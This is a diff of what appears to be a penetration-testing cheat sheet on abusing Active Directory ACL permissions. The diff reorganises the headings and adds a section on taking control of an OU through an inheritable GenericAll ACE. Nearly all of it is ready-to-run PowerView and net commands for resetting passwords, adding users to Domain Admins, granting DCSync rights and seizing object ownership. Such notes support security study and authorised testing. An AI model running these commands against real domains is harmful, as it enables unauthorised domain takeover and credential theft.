@@ -227,8 +227,9 @@ Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbos
 - `ObjectDN` = The object the permissions apply to
 - `ActiveDirectoryRight` == Permissions
 - `IdentityReferenceName` == Object who has the permissions
+- Edge cases
 
-### Scan for ACL permissions
+#### Scan for ACL permissions
 ```
 Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN>
 Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN> | Select-Object ObjectDN, ActiveDirectoryRights, Identityreference
@@ -268,6 +269,7 @@ Get-ObjectAcl -SamAccountName <TARGET USER> -ResolveGUIDs | ? {$_.SecurityIdenti
 
 - In case you have WriteOwner permissions you can add a owner to the object.
 
+### Generic all on user
 #### Reset password of a user
 ```
 net user <USERNAME> <PASSWORD> /domain
@@ -290,12 +292,6 @@ Set-DomainObject -Identity <USERNAME> -Set @{serviceprincipalname='<SERVICE>/<SP
 setspn.exe -d <SERVICE>/<SPN> <DOMAIN>\<USERNAME>
 ```
 
-### Add user to a group
-```
-Add-DomainGroupMember -Identity "<GROUP>" -Members <DOMAIN>\<USER>
-net group "Domain Admins" analyst1 /domain /add
-```
-
 #### Add preauthnotreq flag
 - Then as-repreoast the user [AS-REP Roasting](#AS-REP-Roasting) 
 - Execute command again to revert it
@@ -303,8 +299,15 @@ net group "Domain Admins" analyst1 /domain /add
 Set-DomainObject -Identity <USERNAME> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
 
+### GenericAll permission on a Group, Write permission, Write-Owner permission or Self permission
+#### Add user to a group
+```
+Add-DomainGroupMember -Identity "<GROUP>" -Members <DOMAIN>\<USER>
+net group "Domain Admins" analyst1 /domain /add
+```
+
+### Writedacl on Domain Object
 #### Add permissions for dcsync
-- When writedacl on domain object
 ```
 Add-DomainObjectAcl -TargetIdentity 'DC=<PARENT DOMAIN>,DC=<TOP DOMAIN>' -PrincipalIdentity '<CHILD DOMAIN>\<USER>' -Rights DCSync -Verbose
 
@@ -312,7 +315,33 @@ Add-DomainObjectAcl -TargetIdentity 'DC=<PARENT DOMAIN>,DC=<TOP DOMAIN>' -Princi
 Add-ObjectAcl -PrincipalIdentity exch_adm -Rights DCSync
 ```
 
-#### Change owner
+### With GenericAll Over a Domain Object
+- Execute DC Sync
+
+### With GenericAll Over an OU
+- The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. 
+
+#### Fetch guids for all objects
+```
+$Guids = Get-DomainGUIDMap
+$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name
+```
+
+#### Grant user full control of all descendant objects:
+```
+$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity '<USER>' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid
+```
+
+#### Apply this ACE to our target OU:
+```
+$OU = Get-DomainOU -Raw (OU GUID)
+$DsEntry = $OU.GetDirectoryEntry()
+$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
+$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
+$dsEntry.PsBase.CommitChanges()
+```
+
+### Writeowner of an object - Change the owner
 - When writeowner
 ```
 Set-DomainObjectOwner -Credential $creds -Identity <OBJECT FQDN OR SID> -OwnerIdentity <NEW OWNER>
@@ -320,13 +349,13 @@ Set-DomainObjectOwner -Credential $creds -Identity <OBJECT FQDN OR SID> -OwnerId
 Get-ObjectAcl -Identity bank-dc.els.bank -ResolveGUIDs | Where-Object -Property SecurityIdentifier -Match <SID NEW OWNER>
 ```
 
-#### Add GenericAll
-- When owner of an object
+### Owner of an object - Add GenericAll
 ```
 Add-DomainObjectAcl -Credential $creds -TargetIdentity "<OBJECT FQDN OR SID>" -Rights all -PrincipalIdentity <USER WHO GETS GENERIC ALL> -Verbose
 
 Get-ObjectAcl -Identity "<OBJECT FQDN OR SID>" -ResolveGUIDs | Where-Object -Property SecurityIdentifier -Match <SID OF USER WHO GETS GENERIC ALL>
 ```
+
 
 #### NTLMRelay
 - It is possible to abuse ACL with NTLMRelay abuse
